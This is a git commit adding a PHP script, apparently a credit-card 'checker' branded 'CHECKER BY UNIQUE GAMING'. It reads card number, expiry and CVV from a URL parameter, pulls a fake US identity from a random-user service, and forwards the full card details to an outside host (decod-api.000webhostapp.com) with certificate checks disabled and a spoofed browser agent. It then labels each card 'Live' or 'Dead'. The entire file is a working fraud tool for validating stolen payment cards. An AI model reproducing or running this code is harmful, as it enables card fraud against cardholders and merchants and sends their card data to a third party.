b2c24db5eeefd9b3a5606f09c103fb334b1f60db
Anup <132137174+Unique-Gaming@users.noreply.github.com>
2023-09-30 15:09:02 +0530

    Create api.php

---
+++ api.php
@@ -0,0 +1,75 @@
+<?php
+
+error_reporting(0);
+
+
+
+
+function multiexplode($delimiters, $string) {
+  $one = str_replace($delimiters, $delimiters[0], $string);
+  $two = explode($delimiters[0], $one);
+  return $two;
+}
+$lista = $_GET['lista'];
+$cc = multiexplode(array(":", "|", ""), $lista)[0];
+$mes = multiexplode(array(":", "|", ""), $lista)[1];
+$ano = multiexplode(array(":", "|", ""), $lista)[2];
+$cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
+function getStr2($string, $start, $end) {
+  $str = explode($start, $string);
+  $str = explode($end, $str[1]);
+  return $str[0];
+}
+$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
+preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+        $name = $matches1[1][0];
+        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+        $last = $matches1[1][0];
+        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+        $email = $matches1[1][0];
+        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+        $street = $matches1[1][0];
+        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+        $city = $matches1[1][0];
+        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+        $state = $matches1[1][0];
+        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+        $phone = $matches1[1][0];
+        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+        $postcode = $matches1[1][0];
+        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+        $email = $matches1[1][0];
+
+$lista = "$cc|$mes|$ano|$cvv";
+
+
+  
+$ch = curl_init('');
+curl_setopt($ch, CURLOPT_URL, 'https://decod-api.000webhostapp.com/chgapi.php?lista='.$lista.''); //หาไส่เองนะค่ะ
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
+    ));
+
+$response3 = curl_exec($ch);
+
+
+if (strpos($response3, "Declined") !== false) {
+    echo '<span class="badge badge-danger">💀Dead💀</span>  '.$lista.' | CHECKER BY UNIQUE GAMING |  <b> ❌ Declined ❌  </b>';
+  
+} 
+elseif (strpos($response3, "API ERORR") !== false){
+    echo '<b>❌❌API ERORR OR RATE LIMIT CONTACT THE OWNER TO FIX THIS</b>';
+}else {
+    echo '<span class="badge badge-success">#Live</span> '.$lista.' | CHECKER BY UNIQUE GAMING | <b style="color: white;"> ❤Live❤)   <br>';
+}
+
+?>
